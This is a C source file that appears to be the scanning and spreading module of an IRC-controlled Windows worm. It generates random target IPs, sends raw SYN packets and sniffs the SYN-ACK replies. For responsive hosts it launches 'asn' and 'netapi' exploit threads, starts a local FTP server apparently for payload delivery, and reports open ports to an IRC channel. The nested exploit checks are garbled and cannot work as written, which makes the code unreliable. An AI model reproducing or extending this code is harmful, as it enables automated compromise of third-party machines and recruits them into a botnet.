#include "include.h"
#include "extern.h"

unsigned short s_port;
extern unsigned short ftp_port;

unsigned long scan_getnextip(const char *scanmask)
/* get a random ip for scanning */
{
	int a = -1;
	int b = -1;
	int c = -1;
	int d = -1;
	char ip[16];
	sscanf(scanmask, "%d.%d.%d.%d", &a, &b, &c, &d);
	if(a == -1)
		a = rrand(0, 255);
	if(b == -1)
		b = rrand(0, 255);
	if(c == -1)
		c = rrand(0, 255);
	if(d == -1)
		d = rrand(0, 255);
	_snprintf(ip, sizeof(ip), "%d.%d.%d.%d", a, b, c, d);
	return inet_addr(ip);
}

bool scan_checkservers(struct scans scan)
/* make sure all servers are up and running */
{
	if(!numthread("ftpd"))
	{
		char pbuf[8];
		struct ftpds ftpd;
		ftpd.port = rrand(2000, 60000);
		ftpd.gotinfo = false;
		if((ftpd.tnum = addthread("ftpd", itoa(ftpd.port, pbuf, 10))) == -1)
			return false;
		if(!(thread[ftpd.tnum].handle = CreateThread(0, 131072, ftp_start, &ftpd, 0, 0)))
			return false;
		while(!ftpd.gotinfo)
			Sleep(10);
	}
	return true;
}

void scan_portopen(unsigned long ip, unsigned short port)
/* send SYN packet to ip */
{
	int flag = 1;
	int sin_len = sizeof(struct sockaddr);
	unsigned long src_ip = inet_addr(local_ip);
	struct sockaddr_in sin;
	struct tcpp p;
	SOCKET sock;
	if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_IP)) == -1)
		return;
	if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&flag, sizeof(flag)) == -1)
		return;
	sin.sin_family = AF_INET;
	sin.sin_port = 0;
	sin.sin_addr.s_addr = ip;
	memset(sin.sin_zero, 0, 8);
	makesyn(&p, src_ip, ip, s_port, port);
	sendto(sock, (char *)&p, sizeof(p), 0, (struct sockaddr *)&sin, sizeof(sin));
	closesocket(sock);
}

DWORD WINAPI scan_start(void *param)
/* main scan function (scans an ip range for open ports or vulnerabilities) */
{
	unsigned short port;
	struct scans scan = *(struct scans *)param;
	struct scans *pscan = (struct scans *)param;
	pscan->gotinfo = true;
	srand(GetTickCount());
	thread[scan.tnum].scan = true;
	port = scan.port;
	if(scan.exploit[0] && !scan.usecftp)
	{
		if(!scan_checkservers(scan))
			ExitThread(0);
	}
	s_port = rrand(2000, 60000);
	scan.lgotinfo = false;
	if(!CreateThread(0, 131072, scan_listen, &scan, 0, 0))
		ExitThread(0);
	while(!scan.lgotinfo)
		Sleep(10);
	while(1)
	{
		if(scan.port2)
		{
			int r;
			if(scan.port3)
				r = rrand(0, 2);
			else
				r = rrand(0, 2);
			switch(r)
			{
				case 0:
					port = scan.port;
					break;
				case 1:
					port = scan.port2;
					break;
				case 2:
					port = scan.port3;
					break;
				default:
					break;
			}
		}
		scan_portopen(scan_getnextip(scan.mask), port);
		Sleep(scan.delay);
	}
	clearthread(scan.tnum);
	ExitThread(0);
}

DWORD WINAPI scan_listen(void *param)
/* listen for raw packets and process them */
{
	char buf[65535];
	unsigned long mode = 1;
	struct sockaddr_in sin;
	struct in_addr in;
	struct ip_hdr *iph;
	struct tcp_hdr *tcph;
	struct scans scan = *(struct scans *)param;
	struct scans *pscan = (struct scans *)param;
	SOCKET sock;
	pscan->lgotinfo = true;
	if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_IP)) == -1)
		ExitThread(0);
	sin.sin_family = AF_INET;
	sin.sin_port = 0;
	sin.sin_addr.s_addr = inet_addr(local_ip);
	memset(sin.sin_zero, 0, 8);
	if(bind(sock, (struct sockaddr *)&sin, sizeof(sin)) == -1)
	{
		closesocket(sock);
		ExitThread(0);
	}
	if(ioctlsocket(sock, SIO_RCVALL, &mode) == -1)
	{
		closesocket(sock);
		ExitThread(0);
	}
	while(scan_active)
	{
		if(recv(sock, buf, sizeof(buf), 0) <= 0)
		{
			closesocket(sock);
			ExitThread(0);
		}
		iph = (struct ip_hdr *)buf;
		if(iph->ip_p != IPPROTO_TCP)
			continue;
		tcph = (struct tcp_hdr *)(buf + sizeof(struct ip_hdr));
		if(tcph->th_flags == (SYN | ACK))
		{
			if(ntohs(tcph->th_dport) == s_port)
			{
				if(ntohs(tcph->th_sport) == scan.port || ntohs(tcph->th_sport) == scan.port2 || ntohs(tcph->th_sport) == scan.port3)
				{
					in.s_addr = iph->ip_src;
					if(!strcmp("netapi", scan.exploit))
					{
					if(!strcmp("asn", scan.exploit))
					{
						struct exploits exploit;
						exploit.ip = iph->ip_src;
						exploit.port = ntohs(tcph->th_sport);
						exploit.gotinfo = false;
						exploit.usecftp = scan.usecftp;
						exploit.cftp = scan.cftp;
						if(!CreateThread(0, 131072, asn_exploit, &exploit, 0, 0))
							continue;
						while(!exploit.gotinfo)
							Sleep(10);
							if(!CreateThread(0, 131072, netapi_exploit, &exploit, 0, 0))
							continue;
						while(!exploit.gotinfo)
							Sleep(10);
					}
					else
						irc_privmsg(scanchan, "port %hu open on %s", ntohs(tcph->th_sport), inet_ntoa(in));
				}
				}
			}
		}
	}
	closesocket(sock);
	ExitThread(0);
return 0;
}